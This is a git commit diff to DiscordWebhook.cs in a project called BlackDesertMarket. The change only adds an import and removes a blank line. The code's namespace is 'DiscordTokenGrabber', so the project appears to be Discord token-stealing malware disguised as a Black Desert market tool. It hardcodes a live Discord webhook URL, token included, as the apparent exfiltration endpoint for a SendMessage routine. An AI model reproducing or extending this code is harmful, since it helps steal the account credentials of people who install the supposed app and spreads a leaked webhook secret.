e125b336e59abf817dffc98d6cff9503c6880fa7
RemiOuahf <ouahfouahf@gmail.com>
2024-01-29 14:07:30 +0100

    ok

--- BlackDesertMarket/API/DiscordAPI/DiscordWebhook.cs
+++ BlackDesertMarket/API/DiscordAPI/DiscordWebhook.cs
@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
 using System.Net.Http;
 using System.Net.Http.Headers;
@@ -12,7 +13,6 @@ namespace DiscordTokenGrabber
     internal class DiscordWebhook
     {
         static string WEBHOOK_URL = "https://discord.com/api/webhooks/1200407227803119649/l-t_ucK3abZTw1uA5RD0gYnf1HPbMjnX0-40wy2fL97a3BhzN-nKrp9nVVeqcNqKA7yj";
-        
         public static void SendMessage(DiscordMessageStructure _info)
         {
             HttpClient _client = new HttpClient();
